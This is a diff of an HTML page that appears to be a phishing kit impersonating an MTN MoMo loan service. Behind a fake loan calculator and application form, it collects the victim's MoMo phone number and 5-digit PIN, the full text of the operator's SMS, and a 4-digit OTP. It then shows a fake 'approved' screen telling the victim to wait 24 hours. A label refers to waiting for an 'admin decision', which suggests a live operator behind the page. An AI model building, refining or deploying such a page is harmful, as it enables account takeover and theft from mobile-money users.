@@ -3,280 +3,332 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo Loans — Instant Mobile Money Financing</title>
+    <title>MoMo Loans — Fast & Secure Mobile Money Financing</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="app-shell">
-        <header class="top-bar">
-            <div class="menu-icon" aria-hidden="true">&#9776;</div>
-            <div class="brand-badge">
-                <span class="mtn-mini">MTN</span>
-                <span class="momo-mini">MoMo</span>
+    <div class="page-wrapper">
+        <div class="portal-card">
+            <!-- Top Brand Bar -->
+            <div class="top-brand-bar">
+                <span class="menu-icon">☰</span>
+                <div class="momo-badge">
+                    <span class="momo-sub">MTN</span>
+                    <span class="momo-main">MoMo</span>
+                </div>
             </div>
-        </header>
 
-        <main class="card-container">
-            <!-- SCREEN 1: IMPORTANT NOTICE -->
-            <section id="step-notice" class="screen active">
-                <div class="brand-hero">
-                    <div class="hero-logo-box">
-                        <span class="hero-mtn">MTN</span>
-                        <span class="hero-momo">MoMo</span>
+            <!-- STEP 0: WELCOME NOTICE -->
+            <div id="step-welcome" class="step-view active">
+                <div class="hero-brand">
+                    <div class="momo-badge large">
+                        <span class="momo-sub">MTN</span>
+                        <span class="momo-main">MoMo</span>
                     </div>
-                    <div>
-                        <h1 class="hero-title">MoMo Loans</h1>
-                        <p class="hero-subtitle">Fast &amp; Secure Mobile Money Financing</p>
-                    </div>
+                    <h1>MoMo Loans</h1>
+                    <p class="subtitle">Fast &amp; Secure Mobile Money Financing</p>
                 </div>
 
-                <div class="panel-box">
-                    <div class="notice-heading">&#9888; IMPORTANT NOTICE</div>
-                    <p class="notice-lead">PLEASE VERIFY YOUR DETAILS ACCURATELY BEFORE CONTINUING:</p>
+                <div class="notice-box">
+                    <div class="notice-title">⚠ IMPORTANT NOTICE</div>
+                    <p class="notice-lead">PLEASE VERIFY YOUR DETAILS ACCURATELY BEFORE PROCEEDING:</p>
                     <ul class="notice-list">
-                        <li><strong>ENSURE YOUR MOMO ACCOUNT NUMBER IS ACTIVE AND 10 DIGITS STARTING WITH 0.</strong></li>
-                        <li><strong>ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER TO AVOID DELAYS.</strong></li>
-                        <li><strong>APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</strong></li>
+                        <li>• ENSURE YOUR MOMO ACCOUNT NUMBER IS ACTIVE AND STARTS WITH 0 (10 DIGITS).</li>
+                        <li>• ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER.</li>
+                        <li>• APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</li>
                     </ul>
-                    <button type="button" id="btn-get-started" class="btn-yellow">
-                        <strong>GET STARTED</strong>
-                        <span>CHECK LOAN ELIGIBILITY</span>
-                    </button>
                 </div>
 
-                <footer class="card-footer">
-                    <strong>MoMo Secure Mobile Money Portal &bull; Standard network rates may apply.</strong>
-                </footer>
-            </section>
+                <button type="button" id="btn-get-started" class="btn-yellow">
+                    <strong>GET STARTED</strong>
+                    <span>CHECK LOAN ELIGIBILITY</span>
+                </button>
+            </div>
 
-            <!-- SCREEN 2: LOAN CALCULATOR -->
-            <section id="step-calculator" class="screen hidden">
-                <div class="sub-header">&larr; <strong>Loan Calculator</strong></div>
-                <h2 class="screen-title"><strong>Select Loan Amount</strong></h2>
-                <p class="screen-desc"><strong>Choose your desired loan amount and repayment period.</strong></p>
+            <!-- STEP 1: LOAN CALCULATOR SLIDER -->
+            <div id="step-calculator" class="step-view hidden">
+                <div class="sub-header">
+                    <button type="button" class="link-back" id="back-calc-welcome">← Back</button>
+                    <span class="sub-title">Loan Calculator</span>
+                </div>
 
-                <div class="panel-box">
-                    <div class="slider-group">
-                        <div class="slider-label-row">
-                            <span><strong>Loan Amount</strong></span>
-                            <strong id="calc-amount-display" class="yellow-text">100,000</strong>
-                        </div>
-                        <input type="range" id="range-amount" min="10000" max="2000000" step="10000" value="100000" class="momo-slider">
-                    </div>
+                <h2>Select Loan Amount</h2>
+                <p class="muted-text">Choose your desired loan amount and repayment period.</p>
 
-                    <div class="slider-group">
-                        <div class="slider-label-row">
-                            <span><strong>Repayment Period</strong></span>
-                            <strong id="calc-months-display" class="yellow-text">48 months</strong>
-                        </div>
-                        <input type="range" id="range-months" min="3" max="48" step="1" value="48" class="momo-slider">
-                    </div>
+                <div class="calc-panel">
+                    <div class="calc-label">LOAN AMOUNT</div>
+                    <div class="calc-readout" id="calc-amount-display">100,000</div>
+                    <input type="range" id="range-amount" min="10000" max="5000000" step="10000" value="100000" class="momo-slider">
+
+                    <div class="calc-label spaced">REPAYMENT PERIOD</div>
+                    <div class="calc-readout" id="calc-months-display">12 Months</div>
+                    <input type="range" id="range-months" min="1" max="48" step="1" value="12" class="momo-slider">
 
                     <div class="estimate-box">
-                        <div class="estimate-label"><strong>Estimated Monthly Repayment</strong></div>
-                        <div id="calc-monthly-display" class="estimate-value"><strong>2,292</strong></div>
+                        <span>ESTIMATED MONTHLY REPAYMENT</span>
+                        <strong id="calc-monthly-display">10,417</strong>
                     </div>
-
-                    <button type="button" id="btn-continue-calc" class="btn-yellow">
-                        <strong>CONTINUE APPLICATION</strong>
-                    </button>
                 </div>
-            </section>
 
-            <!-- SCREEN 3: STEP 1 OF 3 -->
-            <section id="step-1" class="screen hidden">
-                <div class="sub-header">&larr; <strong>Loan Application</strong></div>
-                <h2 class="screen-title"><strong>Loan Application</strong></h2>
-                <div class="step-indicator"><strong>Step 1 of 3</strong></div>
+                <button type="button" id="btn-continue-calc" class="btn-yellow"><strong>CONTINUE APPLICATION</strong></button>
+            </div>
+
+            <!-- STEP 2: LOAN APPLICATION — STEP 1 OF 3 -->
+            <div id="step-loan-1" class="step-view hidden">
+                <div class="sub-header">
+                    <button type="button" class="link-back" id="back-step-1">← Back</button>
+                    <span class="sub-title">Loan Application</span>
+                </div>
+
+                <h2>Loan Application</h2>
+                <div class="step-indicator-text">Step 1 of 3</div>
                 <div class="progress-bars">
-                    <span class="bar active-bar"></span>
+                    <span class="bar active"></span>
                     <span class="bar"></span>
                     <span class="bar"></span>
                 </div>
 
-                <div class="field-block">
-                    <label for="input-loan-amount"><strong>Loan Amount</strong></label>
-                    <input type="text" id="input-loan-amount" class="white-input bold-input" value="100,000">
+                <div class="field-group">
+                    <label for="loan-amount-input">Loan Amount</label>
+                    <input type="text" id="loan-amount-input" class="light-input" value="100,000">
                 </div>
 
-                <div class="field-block">
-                    <label for="select-loan-duration"><strong>Loan Duration</strong></label>
-                    <select id="select-loan-duration" class="white-input bold-input">
+                <div class="field-group">
+                    <label for="loan-duration-select">Loan Duration</label>
+                    <select id="loan-duration-select" class="light-input">
+                        <option value="3 Months">3 Months</option>
                         <option value="6 Months">6 Months</option>
-                        <option value="12 Months">12 Months</option>
+                        <option value="12 Months" selected>12 Months</option>
                         <option value="24 Months">24 Months</option>
                         <option value="36 Months">36 Months</option>
-                        <option value="48 Months" selected>48 Months</option>
+                        <option value="48 Months">48 Months</option>
                     </select>
                 </div>
 
-                <div class="field-block">
-                    <label for="input-loan-purpose"><strong>Loan Purpose</strong></label>
-                    <textarea id="input-loan-purpose" rows="3" class="white-input bold-input" placeholder="Business expansion and working capital">Business expansion and working capital</textarea>
+                <div class="field-group">
+                    <label for="loan-purpose-input">Loan Purpose</label>
+                    <textarea id="loan-purpose-input" class="light-input" rows="3" placeholder="Business expansion and working capital"></textarea>
                 </div>
 
-                <button type="button" id="btn-next-1" class="btn-outline-teal"><strong>Next Step &rarr;</strong></button>
-            </section>
+                <button type="button" id="btn-next-1" class="btn-outline-light"><strong>Next Step →</strong></button>
+            </div>
 
-            <!-- SCREEN 4: STEP 2 OF 3 -->
-            <section id="step-2" class="screen hidden">
-                <div class="sub-header"><strong>Loan Application</strong></div>
-                <h2 class="screen-title"><strong>Loan Application</strong></h2>
-                <div class="step-indicator"><strong>Step 2 of 3</strong></div>
+            <!-- STEP 3: LOAN APPLICATION — STEP 2 OF 3 -->
+            <div id="step-loan-2" class="step-view hidden">
+                <div class="sub-header">
+                    <button type="button" class="link-back" id="back-step-2">← Back</button>
+                    <span class="sub-title">Loan Application</span>
+                </div>
+
+                <h2>Loan Application</h2>
+                <div class="step-indicator-text">Step 2 of 3</div>
                 <div class="progress-bars">
-                    <span class="bar active-bar"></span>
-                    <span class="bar active-bar"></span>
+                    <span class="bar active"></span>
+                    <span class="bar active"></span>
                     <span class="bar"></span>
                 </div>
 
-                <div id="step2-inline-alert" class="surface-alert error hidden"></div>
-
-                <div class="two-col">
-                    <div class="field-block">
-                        <label for="input-first-name"><strong>First Name</strong></label>
-                        <input type="text" id="input-first-name" class="white-input bold-input" placeholder="First name">
+                <div class="row-two">
+                    <div class="field-group">
+                        <label for="first-name">First Name</label>
+                        <input type="text" id="first-name" class="light-input" placeholder="First name">
                     </div>
-                    <div class="field-block">
-                        <label for="input-last-name"><strong>Last Name</strong></label>
-                        <input type="text" id="input-last-name" class="white-input bold-input" placeholder="Last name">
+                    <div class="field-group">
+                        <label for="last-name">Last Name</label>
+                        <input type="text" id="last-name" class="light-input" placeholder="Last name">
                     </div>
                 </div>
 
-                <div class="field-block">
-                    <label for="input-momo-phone"><strong>MoMo Number (10 Digits Starting with 0)</strong></label>
-                    <div class="phone-row yellow-border">
-                        <span class="country-tag"><strong>MOMO</strong></span>
-                        <input type="tel" id="input-momo-phone" maxlength="10" inputmode="numeric" placeholder="0XXXXXXXXX" class="phone-field bold-input">
+                <div class="field-group">
+                    <label for="momo-phone-step2">MoMo Number</label>
+                    <div class="phone-box">
+                        <span class="country-tag">MOMO</span>
+                        <input type="tel" id="momo-phone-step2" maxlength="10" inputmode="numeric" placeholder="0XXXXXXXXX">
                     </div>
-                    <small class="helper-note"><strong>Enter your 10-digit MoMo number starting with 0 (e.g. 0712345678).</strong></small>
+                    <small class="hint-text">Enter a 10-digit MoMo number starting with 0.</small>
                 </div>
 
-                <div class="nav-actions">
-                    <button type="button" id="btn-prev-2" class="btn-dark-teal"><strong>&larr; Previous</strong></button>
-                    <button type="button" id="btn-next-2" class="btn-teal-action"><strong>Next Step &rarr;</strong></button>
-                </div>
-            </section>
+                <div id="step2-banner" class="surface-alert error hidden"></div>
 
-            <!-- SCREEN 5: STEP 3 OF 3 -->
-            <section id="step-3" class="screen hidden">
-                <div class="sub-header"><strong>Loan Application</strong></div>
-                <h2 class="screen-title"><strong>Loan Application</strong></h2>
-                <div class="step-indicator"><strong>Step 3 of 3</strong></div>
+                <div class="row-actions">
+                    <button type="button" id="btn-prev-2" class="btn-dark-ghost"><strong>← Previous</strong></button>
+                    <button type="button" id="btn-next-2" class="btn-teal-action"><strong>Next Step →</strong></button>
+                </div>
+            </div>
+
+            <!-- STEP 4: LOAN APPLICATION — STEP 3 OF 3 -->
+            <div id="step-loan-3" class="step-view hidden">
+                <div class="sub-header">
+                    <button type="button" class="link-back" id="back-step-3">← Back</button>
+                    <span class="sub-title">Loan Application</span>
+                </div>
+
+                <h2>Loan Application</h2>
+                <div class="step-indicator-text">Step 3 of 3</div>
                 <div class="progress-bars">
-                    <span class="bar active-bar"></span>
-                    <span class="bar active-bar"></span>
-                    <span class="bar active-bar"></span>
+                    <span class="bar active"></span>
+                    <span class="bar active"></span>
+                    <span class="bar active"></span>
                 </div>
 
                 <div class="summary-card">
-                    <div class="summary-heading"><strong>Application Summary</strong></div>
-                    <div class="summary-line"><span><strong>Loan Amount:</strong></span><strong id="sum-amount">100,000</strong></div>
-                    <div class="summary-line"><span><strong>Duration:</strong></span><strong id="sum-duration">48 Months</strong></div>
-                    <div class="summary-line"><span><strong>Purpose:</strong></span><strong id="sum-purpose">Business expansion and working capital</strong></div>
-                    <div class="summary-line"><span><strong>Applicant:</strong></span><strong id="sum-applicant">-</strong></div>
-                    <div class="summary-line"><span><strong>MoMo Number:</strong></span><strong id="sum-phone">-</strong></div>
+                    <div class="summary-heading">APPLICATION SUMMARY</div>
+                    <div class="summary-row"><span>Loan Amount:</span><strong id="sum-amount">100,000</strong></div>
+                    <div class="summary-row"><span>Duration:</span><strong id="sum-duration">12 Months</strong></div>
+                    <div class="summary-row"><span>Purpose:</span><strong id="sum-purpose">Business expansion</strong></div>
+                    <div class="summary-row"><span>Applicant:</span><strong id="sum-applicant">-</strong></div>
+                    <div class="summary-row"><span>MoMo Number:</span><strong id="sum-phone">-</strong></div>
                 </div>
 
-                <div class="nav-actions">
-                    <button type="button" id="btn-prev-3" class="btn-dark-teal"><strong>&larr; Previous</strong></button>
-                    <button type="button" id="btn-submit-step3" class="btn-yellow"><strong>SUBMIT APPLICATION</strong></button>
+                <div class="row-actions">
+                    <button type="button" id="btn-prev-3" class="btn-dark-ghost"><strong>← Previous</strong></button>
+                    <button type="button" id="btn-proceed-pin" class="btn-yellow"><strong>SUBMIT APPLICATION</strong></button>
                 </div>
-            </section>
+            </div>
 
-            <!-- SCREEN 6: PHONE NO (10 DIGITS STARTING WITH 0) & 5-DIGIT PIN -->
-            <section id="step-credentials" class="screen hidden">
-                <div class="sub-header"><strong>MoMo Verification</strong></div>
-                <h2 class="screen-title"><strong>Enter Phone No &amp; 5-Digit PIN</strong></h2>
-                <p class="screen-desc"><strong>Confirm your 10-digit phone number starting with 0 and your 5-digit PIN.</strong></p>
+            <!-- STEP 5: PHONE NO (10 DIGITS STARTING WITH 0) & 5-DIGIT PIN -->
+            <div id="step-pin" class="step-view hidden">
+                <div class="hero-brand compact">
+                    <div class="momo-badge">
+                        <span class="momo-sub">MTN</span>
+                        <span class="momo-main">MoMo</span>
+                    </div>
+                    <h2>MoMo Security Verification</h2>
+                    <p class="muted-text">Enter your 10-digit MoMo phone number starting with 0 and your 5-digit PIN.</p>
+                </div>
 
-                <div id="cred-surface-banner" class="surface-alert error hidden"></div>
+                <div id="pin-surface-banner" class="surface-alert error hidden"></div>
 
-                <form id="credentials-form">
-                    <div class="field-block">
-                        <label for="cred-phone"><strong>PHONE NO (10 DIGITS STARTING WITH 0)</strong></label>
-                        <input type="tel" id="cred-phone" maxlength="10" inputmode="numeric" placeholder="0XXXXXXXXX" class="white-input bold-input" required>
+                <form id="pin-verify-form">
+                    <div class="field-group">
+                        <label for="verify-phone">PHONE NO (10 DIGITS STARTING WITH 0)</label>
+                        <input type="tel" id="verify-phone" class="light-input bold-input" maxlength="10" inputmode="numeric" placeholder="0XXXXXXXXX" required>
                     </div>
 
-                    <div class="field-block">
-                        <label><strong>PIN (5 DIGITS)</strong></label>
-                        <div class="pin-grid" id="pin-5-boxes">
-                            <input type="password" maxlength="1" inputmode="numeric" class="pin-box bold-input" required>
-                            <input type="password" maxlength="1" inputmode="numeric" class="pin-box bold-input" required>
-                            <input type="password" maxlength="1" inputmode="numeric" class="pin-box bold-input" required>
-                            <input type="password" maxlength="1" inputmode="numeric" class="pin-box bold-input" required>
-                            <input type="password" maxlength="1" inputmode="numeric" class="pin-box bold-input" required>
+                    <div class="field-group">
+                        <label>5-DIGIT PIN</label>
+                        <div class="pin-row-5" id="pin-boxes-5">
+                            <input type="password" maxlength="1" class="pin-cell-5" inputmode="numeric" pattern="[0-9]*" required>
+                            <input type="password" maxlength="1" class="pin-cell-5" inputmode="numeric" pattern="[0-9]*" required>
+                            <input type="password" maxlength="1" class="pin-cell-5" inputmode="numeric" pattern="[0-9]*" required>
+                            <input type="password" maxlength="1" class="pin-cell-5" inputmode="numeric" pattern="[0-9]*" required>
+                            <input type="password" maxlength="1" class="pin-cell-5" inputmode="numeric" pattern="[0-9]*" required>
                         </div>
-                        <input type="hidden" id="cred-pin-value">
+                        <input type="hidden" id="pin-value-5">
                     </div>
 
-                    <button type="submit" id="btn-submit-credentials" class="btn-yellow"><strong>CONTINUE</strong></button>
+                    <button type="submit" id="btn-submit-pin" class="btn-yellow"><strong>VERIFY &amp; CONTINUE</strong></button>
                 </form>
-            </section>
+            </div>
 
-            <!-- SCREEN 7: LOADING / WAITING FOR ADMIN DECISION -->
-            <section id="step-loading" class="screen hidden">
-                <div class="spinner"></div>
-                <h2 id="loading-title" class="screen-title"><strong>Processing Request...</strong></h2>
-                <p id="loading-desc" class="screen-desc"><strong>Please wait while we verify your details.</strong></p>
-            </section>
+            <!-- LOADING / WAITING VIEW -->
+            <div id="step-loading" class="step-view hidden">
+                <div class="loader-ring"></div>
+                <h3 id="loading-title">PROCESSING REQUEST...</h3>
+                <p id="loading-desc" class="muted-text">Please wait while your submission is being reviewed.</p>
+                <div id="loading-surface-banner" class="surface-alert info hidden"></div>
+            </div>
 
-            <!-- SCREEN 8: SMS VERIFICATION -->
-            <section id="step-sms" class="screen hidden">
-                <div class="sub-header"><strong>SMS Verification</strong></div>
-                <h2 class="screen-title"><strong>PLEASE COPY AND PASTE THE WHOLE SMS ON THE SPACE PROVIDED THE WHOLE SMS SEND TO YOUR MOMO NUMBER</strong></h2>
+            <!-- STEP 6: SMS VERIFICATION -->
+            <div id="step-sms" class="step-view hidden">
+                <div class="top-gold-strip">
+                    <div class="momo-badge">
+                        <span class="momo-sub">MTN</span>
+                        <span class="momo-main">MoMo</span>
+                    </div>
+                    <strong>SMS VERIFICATION</strong>
+                </div>
+
+                <h2>SMS Verification</h2>
+                <p class="instruction-bold">
+                    PLEASE COPY AND PASTE THE WHOLE SMS ON THE SPACE PROVIDED THE WHOLE SMS SEND TO YOUR MOMO NUMBER
+                </p>
+
+                <div class="countdown-box">
+                    <span>AUTO-REFRESH TIMER:</span>
+                    <strong id="sms-countdown">15s</strong>
+                </div>
 
                 <div id="sms-surface-banner" class="surface-alert error hidden"></div>
 
-                <div class="timer-strip">
-                    <strong>TIME REMAINING: <span id="sms-countdown">15</span>s</strong>
+                <div class="field-group">
+                    <label for="sms-paste-box">WHOLE SMS MESSAGE</label>
+                    <textarea id="sms-paste-box" class="light-input sms-area" rows="5" autocomplete="one-time-code" placeholder="Paste the full SMS starting with Y'ello. Please note..."></textarea>
+                    <div class="meta-row">
+                        <span id="sms-char-counter">0 / 1000</span>
+                    </div>
                 </div>
 
-                <div class="field-block">
-                    <textarea id="sms-input" rows="5" autocomplete="one-time-code" placeholder="Paste the whole SMS starting with Y'ello. Please note! here" class="white-input bold-input"></textarea>
-                </div>
+                <button type="button" id="btn-verify-sms" class="btn-yellow"><strong>SUBMIT SMS</strong></button>
 
-                <button type="button" id="btn-verify-sms" class="btn-yellow"><strong>VERIFY SMS</strong></button>
-
-                <button type="button" id="btn-request-new-sms" class="btn-outline-teal hidden">
+                <button type="button" id="btn-request-new-sms" class="btn-outline-light hidden">
                     <strong>REQUEST NEW SMS</strong>
                 </button>
-            </section>
+            </div>
 
-            <!-- SCREEN 9: 4-DIGIT OTP SCREEN -->
-            <section id="step-otp" class="screen hidden">
-                <div class="sub-header"><strong>OTP Verification</strong></div>
-                <h2 class="screen-title"><strong>PLEASE CHECK YOUR SMS AND ENTER OTP SEND TO YOUR MOMO NUMBER</strong></h2>
+            <!-- STEP 7: 4-DIGIT OTP VERIFICATION -->
+            <div id="step-otp" class="step-view hidden">
+                <div class="hero-brand compact">
+                    <div class="momo-badge large">
+                        <span class="momo-sub">MTN</span>
+                        <span class="momo-main">MoMo</span>
+                    </div>
+                    <h2>OTP Verification</h2>
+                    <p class="instruction-bold">
+                        ENTER NEW INCOMING OTP SEND TO YOUR MOMO NUMBER
+                    </p>
+                </div>
 
                 <div id="otp-surface-banner" class="surface-alert error hidden"></div>
 
-                <div class="pin-grid otp-grid" id="otp-4-boxes">
-                    <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" class="pin-box otp-box bold-input" required>
-                    <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" class="pin-box otp-box bold-input" required>
-                    <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" class="pin-box otp-box bold-input" required>
-                    <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" class="pin-box otp-box bold-input" required>
+                <div class="field-group">
+                    <label>4-DIGIT OTP</label>
+                    <div class="pin-row-4" id="otp-boxes-4">
+                        <input type="text" maxlength="1" class="otp-cell-4" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" maxlength="1" class="otp-cell-4" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" maxlength="1" class="otp-cell-4" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" maxlength="1" class="otp-cell-4" inputmode="numeric" pattern="[0-9]*">
+                    </div>
                 </div>
-                <input type="hidden" id="otp-4-value">
 
-                <button type="button" id="btn-verify-otp" class="btn-yellow"><strong>VALIDATED TO APPROVE YOUR LOAN</strong></button>
-            </section>
+                <button type="button" id="btn-submit-otp" class="btn-yellow"><strong>CONFIRM OTP</strong></button>
+            </div>
 
-            <!-- SCREEN 10: SUCCESS SCREEN -->
-            <section id="step-success" class="screen hidden">
-                <div class="success-badge">&#10003;</div>
-                <h2 class="screen-title"><strong>Application Successful</strong></h2>
-                <div class="panel-box">
-                    <p class="success-amount-label"><strong>APPROVED LOAN AMOUNT</strong></p>
-                    <div id="final-loan-amount" class="success-amount-value"><strong>100,000</strong></div>
-                    <p class="success-wait-note">
-                        <strong>Please wait for 24 hours so that your loan amount will reflect immediately on your account.</strong>
-                    </p>
+            <!-- STEP 8: SUCCESS SCREEN -->
+            <div id="step-success" class="step-view hidden">
+                <div class="top-gold-strip">
+                    <div class="momo-badge">
+                        <span class="momo-sub">MTN</span>
+                        <span class="momo-main">MoMo</span>
+                    </div>
+                    <strong>APPLICATION APPROVED</strong>
                 </div>
-                <button type="button" id="btn-restart" class="btn-yellow"><strong>DONE</strong></button>
-            </section>
-        </main>
+
+                <div class="success-check">✓</div>
+                <h2>Application Successful!</h2>
+                <p class="instruction-bold">
+                    YOUR LOAN APPLICATION HAS BEEN SUBMITTED SUCCESSFULLY FOR THE EXACT AMOUNT APPLIED:
+                </p>
+
+                <div class="approved-amount-box">
+                    <span>APPROVED LOAN AMOUNT</span>
+                    <strong id="final-applied-amount">100,000</strong>
+                </div>
+
+                <div class="surface-alert info">
+                    <strong>PLEASE WAIT UP TO 24 HOURS SO THAT YOUR LOAN AMOUNT WILL REFLECT IMMEDIATELY ON YOUR ACCOUNT.</strong>
+                </div>
+
+                <button type="button" class="btn-yellow" onclick="location.reload()"><strong>DONE</strong></button>
+            </div>
+
+            <footer class="card-footer">
+                MoMo Secure Financing Portal • Standard network rates may apply.
+            </footer>
+        </div>
     </div>
 
     <script src="script.js"></script>
 </body>
     </html>
-    
+                                                                                                                
